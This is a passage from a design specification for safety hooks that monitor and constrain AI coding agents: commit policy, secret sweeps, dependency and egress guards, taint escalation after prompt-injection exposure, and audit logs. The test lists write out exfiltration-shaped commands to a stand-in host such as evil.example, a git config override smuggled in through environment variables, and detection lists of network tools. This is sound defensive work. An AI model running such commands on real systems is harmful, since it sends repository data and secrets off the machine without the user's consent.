- Before a commit, an empty or placeholder identity (`config.placeholder_identity` default `["*@example.com", "you@*", "*@localhost", ""]`, read with a local `git config --get`) → `deny` "ask the user to fix their git identity; do not change git config yourself". The value is never echoed into model context (memory git-identity-placeholder: this user's global identity is exactly such a placeholder).
- A commit whose effective cwd resolves to a different worktree than the session's project dir (`CLAUDE_PROJECT_DIR`; OpenCode: the plugin's `worktree`) → `ask` (the subagent-inherited-CWD failure the repo's CLAUDE.md warns about).
- A commit on the default branch → `ask` (`config.ask_on_default_branch: true`; trunk-based repos set it false).
- `-F <(...)` / `Uninspectable` messages → `ask` only when a message row is configured; otherwise pass to the commit-msg twin.

**Behavior — data rows (EMPTY in the engine).** `forbid_trailers` (case-insensitive line-start match in the trailer block of `-m` values, heredoc bodies and `-F` files), `allowed_coauthors`, `required_trailers` (e.g. `{"Refs": "^[A-Z]+-\\d+$"}`), `never_commit_globs` (checked against `git diff --cached --name-only` at commit time, plus tracked-modified paths for `commit -a`, and `git add -f` paths). They are filled by the consumer layer `[hooks.git-commit-push-policy-guard]` (§B.1) or an overlay; for example a consumer with this user's commit policy sets `forbid_trailers = ["Co-Authored-By"]` and `never_commit_globs` for harness files (whether this engine repo dogfoods that config is the §K dogfooding question). Opt-in `config.push_requires_green: false`: `git push` / `gh pr create` require `HEAD^{tree}` in the Stop gate's green set, labelled **advisory** because that cache is agent-writable; a pre-push stage that also covers humans is preferred.

**Boundary with §F (commit-message naming).**

| Concern | Owner |
| --- | --- |
| identity, `--author`, signing, `git config` writes, `-c` and `GIT_*` env overrides | this guard |
| worktree and default-branch location of a commit | this guard |
| trailer rows: `forbid_trailers`, `allowed_coauthors`, `required_trailers` (rule ids `CP4xx`) | this guard (`commit_msg_violations`) |
| `never_commit_globs` over staged paths | this guard |
| subject/body form: commitizen (`cz check`, convention from the consumer's `[tool.commitizen]`) plus `[hooks.commit_convention] cutover_date` (addendum D-Q2/D-Q3); a ticket key inside the subject is a `schema_pattern` concern | commit-message-convention (§F.4) |
| `--no-verify` / `-n` / `SKIP=` | block-precommit-bypass (E.2) |

Shared, not duplicated: `gitargv.commit_message_sources()` for message extraction. The naming half has no engine CLI (commitizen is the tool, §F.4). This guard's commit-msg-stage twin is scoped to its own rows only: `playbook check-commit-trailers <msgfile>` **(shared name — proposed)** runs `commit_msg_violations(msg: str, policy: GitPolicy) -> list[str]` (rule ids `CP4xx`) and is rendered only when a trailer row is configured. In-session, this guard and commit-message-convention run in the one Bash dispatcher on the same parsed commit and combine `deny > ask > context > none`. The catalog's "required ticket key" row is split: a ticket **trailer** stays here as `required_trailers`; a ticket in the **subject** is a commitizen `schema_pattern` (E-Q5).

**Implementation.** Handler `git_policy_guard` (`hook_runtime/handlers/git_policy.py`, NEW); local `git config --get` only; it only denies or asks and never rewrites input, so it coexists with a user's own command-rewriting hook. Keys: `gc:shared.protected_branches`, `gc:git-commit-push-policy-guard.{placeholder_identity, ask_on_default_branch, forbid_trailers, allowed_coauthors, required_trailers, never_commit_globs, push_requires_green}`.

**Budget & failure mode.** ~50 ms prefilter per Bash call; ~150-250 ms (4-6 local git subprocesses) when a commit, push, PR or config command is detected. `on_error: ask`.

**Guards.** `ask` rather than `deny` for default-branch and wrong-worktree; data rows empty by default; identity values never echoed.

**Portability.** Shell pre-tool runs on Claude and OpenCode. The commit-msg twin covers every harness, editor-composed messages and human commits.

**Off-workstation twin.** `playbook check-commit-trailers` as a second commit-msg pre-commit entry (`coding-agent-playbook-commit-trailers`, `repo: local`, `language: system`, `stages: [commit-msg]`), beside §F.4's `cz check --commit-msg-file` entry; the init starter adds `default_install_hook_types: [pre-commit, commit-msg]` so a plain `pre-commit install` installs the commit-msg stage. Server-side push rules are the authoritative control.

**Tests.** `tests/hooks/test_git_commit_push_policy_guard.py`, tmp repo: `git commit --author=x` → deny; `git commit -S` → deny; `git config user.email a@b` → deny; `git config --get user.email` → none; placeholder `you@example.com` → deny and the reason does not contain it; `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.email GIT_CONFIG_VALUE_0=x git commit -m m` → deny; with `forbid_trailers=["Co-Authored-By"]` a heredoc message containing that trailer → deny, same commit with empty rows → none; cwd in another worktree → ask; on `main` → ask; `echo git commit --author` → none. `tests/cli/test_check_commit_trailers.py`: the CLI reports only this guard's `CP4xx` rows, exit 1 on a forbidden trailer, exit 0 with empty rows.

#### stop-diff-sweep — Stop-tier secret sweep of the resulting working tree (plus stray secret files and large binaries)

`default` · `stop` (a tier of the single Stop coordinator, run only when the diff vs HEAD or the untracked set is non-empty) · block → `deny` (Stop block) / `context` · label: **detective** (state-based; sees what `sed -i`, heredocs, scripts and generators wrote, which no command matcher sees)

**Behavior.** Gathers the turn's resulting state: added lines of `git diff HEAD -U0 --no-color --no-ext-diff` plus untracked, non-ignored text files from `git ls-files --others --exclude-standard -z`, skipping binaries (NUL in the first 8 KiB) and lockfiles; total bytes capped at `config.max_scan_bytes` (2 MiB) with a "partially scanned" note. Runs the secret ruleset with the same pragma-at-HEAD rule as secret-content-guard. Untracked files matching `SECRET_PATH_GLOBS` and NOT ignored (`git check-ignore --stdin`) are flagged **by path only**, never read: an agent-created `credentials.json` or `.env.prod` that the next `git add -A` would commit. Warns on untracked, non-ignored large or binary artifacts (`*.pt`, `*.pkl`, `*.safetensors`, `*.parquet`, or larger than `config.large_file_mb`, default 10), because `check-added-large-files` is excluded from the air-gapped starter (SPEC.md:1712). The ml-unsafe-deserialization Bash rescan (E.3) rides the same diff walk. Findings join the coordinator's combined Stop block once per working-tree fingerprint ("<rel>:<line> <rule-id>; remove it, move it to env or the secret manager, or gitignore it"); a repeat stop on the same fingerprint gets a `systemMessage` only. Output is masked. PII detectors run only when an overlay enables them (`config.pii: true`, E.5 library).

**Implementation.** Handler `stop_secret_sweep` (`hook_runtime/handlers/stop_sweep.py`, NEW), the coordinator's `secrets` stage (`config.stage = "secrets"`, ordered by `STOP_STAGE_ORDER`: after drift, lint, quality-metrics, docstrings and gate-integrity; principle 7); reuses `security/secrets.py` and `security/patterns.py`; local git subprocesses only. `config.mode = block | warn | off` (default `block`).

**Budget & failure mode.** 50-500 ms depending on diff size, once per Stop with changes, inside the coordinator's <= 3 s default budget. `on_error: open`, but the `systemMessage` always says "partially scanned" or "skipped" so degradation is visible.

**Guards.** Shares the coordinator's one-block-per-fingerprint budget and 40-line cap; path-only for secret files; byte cap.

**Portability.** Inspects git state, not harness payloads, so it is the most portable secret control as a CLI. In-session it needs a blocking Stop: Claude only (OpenCode's `event` hook is not awaited and cannot re-prompt).

**Off-workstation twin.** `playbook scan-secrets --worktree` for humans; `playbook-secrets` (`--staged`) at pre-commit; `--range <base>..HEAD` in `playbook ci`.

**Tests.** `tests/hooks/test_stop_diff_sweep.py`, tmp repo: `sed -i` writing an AWS-shaped key into `config.py` → combined block; untracked `.env.prod` not ignored → flagged by path with an fs spy proving its content was never read; untracked 200 MB `model.pt` (sparse file) → warn line; same fingerprint again → `systemMessage` only; `mode = warn` → no block.

#### dependency-allowlist-guard — Detected package manager, ask before new direct deps, no lockfile hand edits

`default` · `pre_tool_use` · `Bash`: `pip|pip3|python -m pip install|download|wheel`, `uv add`, `uv pip install`, `uv run --with`, `uvx` (incl. `--from git+...`), `uv tool install|run`, `pipx install|run`, `poetry add`, `pdm add`, `conda|mamba install|create`, `npm install|exec`, `npx`, direct VCS/URL requirements; `Edit|Write` on `pyproject.toml`, `requirements*.txt|.in`, `setup.cfg`, `environment.yml`, `uv.lock`, `poetry.lock` · block → `deny` / `ask` · label: **boundary** for manifest edits; **speed bump** for Bash

**Behavior.** Requested names are extracted (PEP 508 specs, wheel filenames, every line of a `-r` file) and PEP 503-normalized. Manifest edits are simulated and a `tomllib` diff covers `[project].dependencies`, `[project.optional-dependencies]`, `[dependency-groups]` and `[tool.poetry.dependencies]`; only NEWLY added names count (existing deps are grandfathered, the metrics non-regression stance). Engine tiers:
- (a) package-manager mismatch from `gc:shared.facts.package_manager` → `deny` with the correction: uv → `uv add X` (dev: `uv add --dev X`); poetry → `poetry add X` (dev: `poetry add --group dev X`); pip-tools → add to `requirements.in`, then `pip-compile`; pip → no mismatch.
- (b) a new direct dependency → `ask`, once per package per session: "Adding <pkg>. The playbook says don't add new dependencies without asking." (generate-tests.md.j2:50).
- (c) hand edits to `uv.lock` / `poetry.lock` → `deny` ("regenerate with `uv lock` / `poetry lock`").
- (d) `--extra-index-url`, a non-default `--index-url`, or an extra uv `--index` → `ask` (the dependency-confusion vector; overlays upgrade it to `deny`; not denied by default because PyTorch CUDA wheel indexes are a common legitimate use in ML repos). This guard is the single owner of index mixing.
- Never fires on `uv sync`, `uv run` without `--with`, or self-installs (`pip install -e .`, `-e ".[dev]"`); never queries an index to check that a package exists (egress, and it leaks the name).
- Overlay tier: `config.allowlist` turns (b) into `deny` for names outside it, with `difflib` "did you mean" hints (slopsquat defense), plus internal-index enforcement (`config.required_index`).

**Implementation.** Handler `dependency_guard` (`hook_runtime/handlers/dependencies.py`, NEW): `shlex`, `re`, `difflib`, no `packaging` on the hot path; `tomllib` is imported lazily on the manifest-edit branch only (a §D.1 branch-local row). PEP 503 normalization lives once in a NEW stdlib module `src/coding_agent_playbook/_pep503.py:canonical_name(spec: str) -> str` (`re.sub(r"[-_.]+", "-", name).lower()`, splitting `name @ url`), and `detector._parse_dep_name` (detector.py:130-138, which lowercases but neither collapses `_`/`.` nor splits `name @ url`) is rewired to it. No `applies_if`: `evaluate_predicate` has no `package_manager` key (detector.py:406-449), so tier (a) is simply inert when the fact is absent. Keys: `gc:shared.facts.package_manager`, `gc:dependency-allowlist-guard.{index_mode="ask", allowlist, required_index}`. The allowlist has one data source rendered into the advisory rule (overlay content, e.g. SPEC §17.2's `30-bnp-banking-dependencies`), `guard_config.json` and the CI step.

**Budget & failure mode.** ~30-100 ms, only on install-like commands and manifest edits. `on_error: ask`.

**Guards.** New names only; deduped per package per session; never fires on sync/run/self-install.

**Portability.** Shell and file pre-tool on Claude and OpenCode; on OpenCode (b) and (d) degrade to `deny` with the reason.

**Off-workstation twin.** `playbook check-deps [--base REF]` **(NEW CLI subcommand)**: diffs manifest dependencies against the base ref and applies the allowlist and index rules; a `playbook ci` step (SPEC §17.2 already assigns enforcement to "a separate package-check step" in CI).

**Tests.** `tests/hooks/test_dependency_allowlist_guard.py`: `pip install requests` in a uv repo → deny naming `uv add`; `uv add requests` → ask, again in the same session → none; Edit `pyproject.toml` adding a dependency → ask, reformatting existing deps → none; `uv sync` → no-op; `pip install -e .` → none; Edit `uv.lock` → deny; `--extra-index-url https://download.pytorch.org/whl/cu121` → ask; `pip download sdist-pkg` → treated as install; `Foo_Bar` == `foo-bar` == `foo.bar`. `tests/unit/test_detector.py`: `_parse_dep_name("Foo_Bar @ https://x/y.whl") == "foo-bar"`.

#### exfil-channel-guard — Ask before data leaves through ordinary tools

`default` · `pre_tool_use` · `Bash`: `git remote add|set-url`; `git push` to a URL or to a remote not configured at session start; `gh gist create`; `gh issue|pr create --body-file <path>`; `curl`/`wget` uploads (`-d @f`, `--data-binary @f`, `-T f`, `-F x=@f`, `--upload-file`, `--post-file`) to non-loopback hosts; `scp`/`rsync`/`sftp` to remote hosts · `ask` (`deny` for secret paths) · label: **speed bump**

**Behavior.** Hosts are strings only (no DNS, no connect probes). New remotes, unconfigured push targets, gist creation, and uploads or copies to non-loopback hosts not in `config.allowed_hosts` (empty by default, so any remote host) → `ask`: "This sends repository data off the machine to <host>. Confirm with the user." An upload or `--body-file` whose path matches `SECRET_PATH_GLOBS` → `deny`. Loopback is always allowed. Pushes to remotes configured at session start (e.g. `origin`) are untouched. Overlays add rows and may upgrade `ask` to `deny`. WebFetch query-string inspection belongs to network-egress-guard's enforce mode (E.5), not here.

**Implementation.** Handler `exfil_guard` (`hook_runtime/handlers/exfil.py`, NEW) over `gitargv` (§D.2.5) and `_hosts`. The configured-remote set is snapshotted by the session_start dispatcher into `<state>`; without a snapshot (OpenCode, missed start) it falls back to the current `git remote -v`. Keys: `gc:exfil-channel-guard.{allowed_hosts, extra_rows}`.

**Budget & failure mode.** < 1 ms incremental; ~5 ms for `git remote get-url` on git segments. `on_error: ask`.

**Guards.** Fires only on rare egress-shaped commands; ordinary pushes untouched.

**Portability.** Shell pre-tool on Claude and OpenCode (`ask` → `deny` on OpenCode).

**Off-workstation twin.** None in-repo; the real barrier is the network layer (sandbox network allowlist, corporate egress proxy). It closes the gap between secrets-path-guard (reads) and network-egress-guard (off by default).

**Tests.** `git remote add x https://evil.example/r.git` → ask; `git push origin feat` → none; `git push https://evil.example/r.git` → ask; `curl -d @data.json http://localhost:8000` → none; `curl -T dump.sql https://x.io` → ask; `gh gist create .env` → deny; `scp a.tar host:/tmp` → ask; a `socket.getaddrinfo` spy is never called.

#### taint-escalation — Escalate risky actions to ask after the session ingests untrusted content

`opt-in` · marking: `post_tool_use` on `WebFetch|WebSearch` and `mcp__.*` tools matching `config.mcp_taint_pattern`, plus `pre_tool_use` on `Read|Grep|Glob` whose realpath is outside the repo root; escalation: `pre_tool_use` on egress, push, install, control-plane edits and secret-adjacent reads · `ask` · label: mixed — **boundary** for structured tools (WebFetch, control-plane `Edit`), **speed bump** for Bash rows

**Behavior.** Once the session is tainted, normally-allowed actions escalate to `ask`: outbound network (exfil and network rows, even with `allowed_hosts`), `git push`, package installs (dependency-guard rows), edits to settings, hooks or MCP config (the control-plane table owned by control-plane-guard, E.1), and reads of secret-adjacent paths (`$HOME` dotfiles outside the repo). Reason: "This session has read untrusted content (<source category>); confirm before <action>." The taint is keyed by `session_id` and clears only at a new session or `session_start` with source `clear`; compaction does not clear it (the summary may carry the content). No content inspection: no regex prompt-injection scanning (that is a rejected entry).

**Implementation.** `handlers: {pre_tool_use: taint_escalation, post_tool_use: taint_escalation:marker}` (`hook_runtime/handlers/taint.py`, NEW); a per-session flag in `<state>` consulted by the existing dispatcher branches. Out-of-repo reads are marked by the pre-tool dispatcher, which already sees every `Read` for secrets-path-guard, so enabling this hook does not widen the `post_tool_use` registration to `Read` (one interpreter start per read). `config.mcp_taint_pattern` default `fetch|browse|http|url|web|search|scrape`.

**Budget & failure mode.** < 1 ms incremental. `on_error: ask`.

**Guards.** Applies only after untrusted ingestion; escalates to `ask`, never `deny` on its own except headless.

**Portability.** Claude and OpenCode (both pre- and post-tool events exist; on OpenCode the escalation degrades to `deny`, which makes it stricter there). MCP-based marking is **degraded** on OpenCode: the shim does not forward MCP tools (§C.3.3), so only `webfetch`/`websearch` and out-of-repo reads mark the session there.

**Off-workstation twin.** None (a session concept); the native sandbox network layer is the real barrier.

**Tests.** Simulate `WebFetch` then `git push origin feat` → ask; without the WebFetch → none; a new `session_id` → cleared; `Read /tmp/x.md` then `uv add requests` → ask (reason names "read outside the repo").

#### command-convention-guard — Data-driven Bash convention rows; the engine ships zero rows

`opt-in` · `pre_tool_use` · `Bash`, each unwrapped segment (wrapper prefixes stripped, so `proxy uv run mypy` matches) · warn → `context` (deny rows → `deny`) · label: **speed bump** (convention, not security)

**Behavior.** Rows `config.rules: [{pattern, decision: deny | warn, message}]`. A `deny` row returns `deny` carrying the corrected command; a `warn` row returns `context` with no permission decision, once per session per row. Never `updatedInput` (L6): a user may already run their own command-rewriting hook, and two rewriters on one call race. Example rows for a consumer config with this repo's conventions (`[hooks.command-convention-guard] rules`, from this repo's CLAUDE.md "Working in this repo" and subagent policy; whether this repo dogfoods them is the §K dogfooding question): `^uv run (mypy|pytest)\b` → deny, "use `uv run python -m mypy` / `uv run python -m pytest -q`"; `(mypy|ruff check|pytest)\s+\S+\.py` → warn, "subset run: fine for iteration, not CI parity".

**Implementation.** Handler `command_convention_guard` (`hook_runtime/handlers/conventions.py`, NEW), a step in the shared Bash dispatcher; rows come only from the consumer layer `[hooks.command-convention-guard] rules`, a repo-local override or an overlay, compiled and `screen_regex`-checked at `playbook validate`; rendered to `gc:command-convention-guard.rules`.

**Budget & failure mode.** < 1 ms incremental. `on_error: open`.

**Guards.** Zero default rows; warns deduped per session; no input rewriting.

**Portability.** Shell pre-tool on Claude and OpenCode.

**Off-workstation twin.** None needed: CI already runs the canonical commands.

**Tests.** With a row for `uv run mypy`: deny carrying the correction; without rows: no handler work; a warn row fires once per session; `proxy uv run mypy` matches with `[hooks] wrapper_prefixes = ["proxy"]` (`guard_config.shell.wrapper_prefixes`); a ReDoS-shaped row fails `playbook validate`.

### E.5 Audit and overlay mechanisms

Two default/opt-in audit hooks, one opt-in compaction aid, and three overlay-tier guards. **Overlay tier — one activation path (locked, §A.6/§B.1/E.0.2):** the engine ships the handler and a `HOOK.md` with `tier: overlay`, `enabled: true` and inert data (`mode: off`, empty tables); `overlay` is never in `[hooks] tiers`, so sync renders no registration fan-out and no `gc:` block for it. A regulated overlay **activates** it with a same-id override that promotes it to `tier: default` (optionally `mandatory: true`) and supplies data. The "only ADD to deny tables" rule is §A.6's layer merge, checked by `playbook validate` (H14): **deny-table keys** (globs, rows, detectors) are `extend`; **relaxing keys** (`allowed_hosts`, `allow_globs`, `allow_paths`, `allowlist` exemptions) are `relax` and are ignored from the consumer layer when the hook is `mandatory`; a repo-local layer can never disable or shadow an overlay-`mandatory` hook (H15; principle 14).

Overlay activation, `playbook-rules-bnp/src/playbook_rules_bnp/resources/hooks/network-egress-guard/HOOK.md` (valid against the §A.2 schema):

```markdown
---
id: network-egress-guard
name: Network egress guard
description: Restrict agent network egress to the organization allowlist.
version: 1
tier: default
mandatory: true
events: [pre_tool_use]
matcher:
  pre_tool_use:
    tools: [shell, web]
handler:
  builtin: network_egress_guard
  config:
    mode: enforce
    allowed_hosts: [artifactory.bank.example, git.bank.example]
    gateway_hosts: [litellm.bank.example]
    webfetch_max_query_chars: 256
decisions: [deny, ask, none]
timeout: 5
on_error: ask
supports: [claude_code, opencode]
---
Network access is limited to approved internal hosts. Install packages from the
internal index only; do not call public APIs or search the web from this repo.
```

Consumer opt-in for `opt-in` hooks, in `.coding-agent-playbook.toml` (a flat two-level table, within `_dump_toml`'s limits, sources/filesystem.py:113-138; keys defined in §B.1):

```toml
[hooks]
enabled = true                           # required: a table without it is off (§B.1)
enable = ["taint-escalation", "local-audit-log", "precompact-checkpoint"]
disable = ["destructive-command-guard"]  # an equivalent user-level guard already runs
```

#### guard-decision-log — Local log of guard deny/ask/warn/override/degraded events (no content)

`default` · every dispatcher event (`pre_tool_use`, `post_tool_use`, `post_tool_use_failure`, `user_prompt_submit`, `stop`, `subagent_stop`, `session_start`, `pre_compact`) as an in-process decision sink, not a registration of its own · log → `none` · label: n/a (the measurement substrate)

**Behavior.** Appends one JSON line per non-`none` decision, per escape-hatch use, and per degraded canary: `ts`, `harness`, `session_id`, `hook_id`, `rule_id`, `decision`, `tool_name`, optional `degraded` / `escape` flags. It never stores command text, paths, prompts or file contents: a free-form command cannot be redacted reliably (`mysql -pS3cret`, `curl -u user:pass`), so it is not stored at all. Location `<state>/decisions-YYYY-MM.jsonl`: outside the working tree (not reachable by repo search, survives `git clean -x`), mode 0600, size-rotated, one `O_APPEND` write per line. It never blocks, never prints to the model, never uses the network. `playbook-hook doctor` summarizes it per guard: deny/ask counts, override rates, degraded events — the evidence required before flipping any `ask` to `deny` or promoting an opt-in hook (principle 17).

**Implementation.** `security/audit.py::append_decision(state_dir: Path, record: GuardDecisionRecord) -> None`, the typed wrapper over the generic `append_jsonl(path, record)` (both defined in §D.6.2), called by the dispatcher's decision combiner (no extra process); `json.dumps(sort_keys=True)`; `fcntl.flock` / `msvcrt.locking` for concurrent sessions and subagents (Windows ACL limits documented). Its `HOOK.md` exists so the sink can be disabled and so the body degrades to AGENTS.md like every hook; its `handler` is `{builtin: decision_log}` registered as a sink kind **(shared name — proposed)** that receives decisions and cannot return one. The same writer later implements SPEC §17.4's `playbook sync` audit line, for which no writer exists in `src/` today.

**Budget & failure mode.** ~1-2 ms per decision, in-process. `on_error: open`, silently, with one stderr note per session.

**Guards.** No content captured; size rotation; local only.

**Portability.** Harness-independent: written by the engine's own dispatchers on every harness that has them.

**Off-workstation twin.** n/a.

**Tests.** `tests/security/test_audit.py`: a deny through `playbook-hook simulate` writes one line with the expected fields under `<state>` and none of the command's or path's substrings; two concurrent writer processes produce valid JSONL; rotation at the size cap.

#### local-audit-log — Full local activity audit log (structure-only), overlay-enabled

`opt-in` · `post_tool_use` (all tools, **async** registration) + `session_start` / `session_end` / `user_prompt_submit` metadata · log → `none` · label: n/a

**Behavior.** Extends guard-decision-log with per-tool-call records: `tool_name`, exit status, `duration_ms`, repo-relative paths (secret-glob paths recorded as the category `secret-path` only). Commands are captured as **structure only**: argv0, subcommand and flag NAMES (`mysql -p` but never `S3cret`), never values or positional args; redacted full text requires `config.full_commands: true`. Prompts are recorded only as length, sha256 and detector category counts. An optional hash chain (`prev` = sha256 of the previous line) is documented as corruption detection, not tamper evidence, unless the org's log shipper anchors the head hash externally. Stored outside the working tree (`<state>` or XDG state), never on the network; an org that wants SIEM centralization points its own shipper at the file. Retention `config.retain_days`. Claude's `ConfigChange` is not a canonical event and is not covered.

**Implementation.** Handler `activity_log` (declares `ASYNC_SAFE = True`) over `security/audit.py::append_activity(...)` (NEW, built on `append_jsonl`). To avoid one interpreter start per `Read`/`Grep`/`Glob`, the claude_code adapter renders it through §C.2.1's single optional **`async: true`**, non-deciding `PostToolUse` registration with matcher `*` — the accepted amendment to L3 (OQ-19). Async hooks never block and have no enforced timeout; their results are **delivered on the next turn**, so the handler writes nothing to stdout; they are killed at `-p` teardown, so headless runs may lose trailing lines. OpenCode: the same handler runs from `tool.execute.after` without awaiting the child.

**Budget & failure mode.** Effectively 0 on the hot path (async); 30-60 ms if run synchronously. `on_error: open`.

**Guards.** No contents or prompt text; structure-only commands by default; rotation and retention.

**Portability.** Post-tool events exist on both rendered harnesses; async semantics are Claude's.

**Off-workstation twin.** The org's own log shipper; SPEC §17.4's sync line.

**Tests.** A Bash call `mysql -pS3cret db` → the line holds argv0 `mysql` and flag `-p` but not `S3cret`; the async dispatch writes **empty stdout**; a truncated line is detected by the chain check; `tests/adapters/test_claude_code.py`: enabling it adds exactly one async `PostToolUse` entry (lock `artifact_id = "registration:post_tool_use:async"`) and leaves the synchronous dispatcher entry unchanged.

#### precompact-checkpoint — Offsets of genuine user constraints, re-injected after compaction

`opt-in` · `pre_compact` (matcher `manual|auto`) + `session_start` (source `compact`) · log → `none` at `pre_compact`; `context` at `session_start` · label: n/a

**Behavior.** At `pre_compact` it stores **no message text**: only transcript entry uuids or offsets of the last ~10 genuine human prompts (excluding `tool_result`, `isMeta` reminders, hook output and command-output wrappers) plus the files edited this session. At `session_start` with source `compact` it re-reads those entries from `transcript_path`, runs the secret detectors (and PII detectors if an overlay enabled them), and injects them as quoted, attributed excerpts capped at ~10 lines: "Before compaction the user said: «...»". Git and gate state re-injection is already in the default briefing (E.1). Only genuine human prompts are ever re-injected as user instructions; re-injecting hook output would launder prompt injection (principle 15). Repo-derived strings are sanitized (control characters and newlines stripped, length-capped).

**Implementation.** `handlers: {pre_compact: precompact_checkpoint, session_start: precompact_checkpoint:reinject}` (`hook_runtime/handlers/compaction.py`, NEW); stdlib JSONL parse, no LLM, no network; state in `<state>`, TTL-pruned at session start. The transcript format is Claude-internal and unversioned: any parse surprise fails open.

**Budget & failure mode.** ~100-300 ms per compaction (rare). `on_error: open`.

**Guards.** No persisted prompt text; human-authored entries only; capped and pruned; regulated overlays can force it off.

**Portability.** Claude only (`PreCompact`, `SessionStart` source `compact`). OpenCode has no `transcript_path` to checkpoint and no post-compaction SessionStart; `experimental.session.compacting` could inject context, but there is nothing to re-read, so `pre_compact` is not registered there (§C.1.2).

**Off-workstation twin.** n/a.

**Tests.** Fake transcript with a human prompt "do not push", a hook-output entry and an `isMeta` reminder: only the human prompt is re-injected, quoted; the `<state>` file contains no prompt text; a transcript with an unknown entry shape → no injection, no error.

#### pii-prompt-guard — Checksum-validated PII block on user prompts (mechanism in the engine, enabled by the regulated overlay)

`overlay` · `user_prompt_submit` · any prompt · block → `deny` (rendered as Claude `decision: "block"`) · label: **boundary** for prompt text, documented as a DLP assist (images, paraphrase and `@`-file attachments are not covered)

**Behavior.** Detectors run before the prompt leaves for the model endpoint. Engine library: IBAN (ISO 13616 country length table + mod-97) and card PAN (Luhn + grouping and IIN sanity). Overlay data: French NIR, US SSN, org identifiers, each as a regex plus a **named** checksum from the engine library (data-only; overlays ship no code). Published test values (e.g. `4111 1111 1111 1111`) are allowlisted; email and phone are off. A hit blocks; the user sees the category, offset and a masked form (never the value) and is told to resubmit with a placeholder. Claude Code cannot rewrite the prompt, and the block reason is shown to the user, not to the model. Input is size-capped and scanned in chunks. **Fail closed** (once activated; see the per-layer `on_error` below): an internal error is handled by the failure policy for `on_error: deny` and rendered per §D.3.5 as `{"decision":"block","reason":"PII guard error; resubmit or use the override"}` on exit 0 (a human is present to resubmit). A dead interpreter or crashed dispatcher is covered only by the strict-mode `onFailure: "block"` + `--strict-launch` rendering below. The override token (`config.override_token`) is logged by category only; overlays can disable it.

**Implementation.** Handler `pii_prompt_guard`; library `security/pii.py` (NEW): `PII_DETECTORS: dict[str, Callable[[str], list[PiiMatch]]]`, `iban_valid(s: str) -> bool`, `luhn_valid(digits: str) -> bool`; stdlib `re` + integer arithmetic; shared with stop-diff-sweep (`config.pii`) and local-audit-log's category counts. **`on_error` per layer.** The engine-shipped `tier: overlay` `HOOK.md` declares `on_error: open`, because H10 rejects `deny` on an engine-sourced definition (and the shipped definition is inert until an overlay activates it). The overlay's promoting same-id override sets `on_error: deny`, the canonical fail-closed value; raising `open` to `deny` is a strengthening that §A.6's layer merge allows (`open` < `ask` < `deny`), consistent with OQ-18. Once that override is active, under the merged strict-mode rule (§C.2.1, QC-11, OQ-18) the adapter renders `"onFailure": "block"` plus `--strict-launch` on the `UserPromptSubmit` registration only when an enabled hook on that event declares `on_error: deny` (Claude Code >= 2.1.295, checked by `doctor`; SchemaStore's schema omits the key, so editors flag it). The registration is shared with prompt-write-scope-guard's ledger (L3), whose `on_error` is `open`, so a ledger error yields `none`; only the PII handler fails closed. Overlay config:

```yaml
config:
  detectors: [iban, card_pan, fr_nir, us_ssn]
  extra_detectors:
    - {name: bank_customer_id, pattern: '\bBNP-\d{10}\b', checksum: mod97}
  test_value_allowlist: ["4111111111111111"]
  override_token: "#pii-ok"
  max_prompt_bytes: 1048576
```

**Budget & failure mode.** < 5 ms scanning plus ~30-50 ms interpreter start, once per prompt. Fail closed.

**Guards.** Checksums keep false positives low; test-value allowlist; masked output.

**Portability.** Claude `UserPromptSubmit`. OpenCode does not render `user_prompt_submit` in v1 (QC-2): the hook declares `supports: [claude_code]`, and `playbook check` lists it as `—` for opencode so the overlay sees the gap.

**Off-workstation twin.** stop-diff-sweep's PII tier and `playbook scan-secrets --pii` in CI when the overlay enables them (catches PII written into files, not prompts).

**Tests.** `tests/security/test_pii.py` + `tests/hooks/test_pii_prompt_guard.py`: a valid example-format IBAN not in the allowlist → block with a masked reason; 16 random digits failing Luhn → none; `4111 1111 1111 1111` → none; a 10 MB paste → chunked, within budget; a forced internal error → `decision: "block"` JSON on exit 0; launcher with `--strict-launch` and a missing pin → exit 1; adapter golden: `onFailure: "block"` and `--strict-launch` present only when this hook is enabled.

#### network-egress-guard — Air-gapped network egress guard (mechanism off in the engine)

`overlay` · `pre_tool_use` · `Bash` argv0 `curl|wget|http|nc|ssh|scp|sftp|rsync|ftp`, `git clone|fetch|pull|push|ls-remote|submodule`, `pip|uv|poetry|pdm|conda|npm`, `docker pull`, `huggingface-cli`; plus `WebFetch|WebSearch` · block → `deny` / `ask` · label: **boundary** for `WebFetch`/`WebSearch`; **speed bump** for Bash (the native sandbox network layer is the real barrier only when enforced through managed settings, E.4 Shared)

**Behavior.** `config.mode = off | ask | enforce`; engine default `off`, the air-gapped overlay sets `enforce` (example above). Hosts are extracted by `_hosts.extract_hosts` (URL args, scp-style `user@host`, `git remote get-url`, index flags, `git+https` requirements), string-only with no DNS, and matched by suffix against `config.allowed_hosts`; loopback is always allowed and `config.gateway_hosts` (e.g. the overlay's LiteLLM gateway) are added automatically. In `enforce`, `WebSearch` is denied and `WebFetch` is allowed only to allowlisted hosts, with `ask` when the URL carries a query string longer than `config.webfetch_max_query_chars`. Edits to `allowed_hosts` are policy edits handled by control-plane-guard (E.1, `ask`). Index mixing stays with dependency-allowlist-guard.

**Implementation.** Handler `network_egress_guard` (`hook_runtime/handlers/network.py`, NEW) in the shared Bash dispatcher; `urllib.parse` + `ipaddress`. When enabled, the claude_code adapter also renders native rows: `permissions.deny: ["WebSearch"]` (holds without a sandbox) and `sandbox.network.allowedDomains` from `allowed_hosts + gateway_hosts`. The latter only pre-allows hosts for **sandboxed** Bash (unlisted hosts prompt); it is a barrier only when the overlay also delivers `sandbox.enabled`, `failIfUnavailable` and `network.strictAllowlist: true` through managed settings (Shared, E.4), otherwise a speed bump. The session briefing (E.1) states the mode so the model does not burn turns retrying.

**Budget & failure mode.** < 1 ms incremental; ~5 ms for `git remote get-url`. `on_error: ask` (`deny` in enforce mode headless).

**Guards.** Off by default; suffix matching; no DNS.

**Portability.** Shell and WebFetch pre-tool on Claude and OpenCode (`webfetch`/`websearch` mapped by the shim).

**Off-workstation twin.** The native sandbox network allowlist and the corporate egress proxy; SPEC §14.1's internal-index-only install path.

**Tests.** Enforce with `allowed_hosts=[artifactory.corp]`: `curl https://pypi.org` → deny; `pip install -i https://artifactory.corp/simple x` → none; `WebSearch` → deny; `WebFetch https://artifactory.corp/x?q=<300 chars>` → ask; `socket.getaddrinfo` spy never called; `mode = off` → not rendered.

#### sensitive-data-read-guard — Raw-data and notebook-output read guard for regulated ML/DS repos

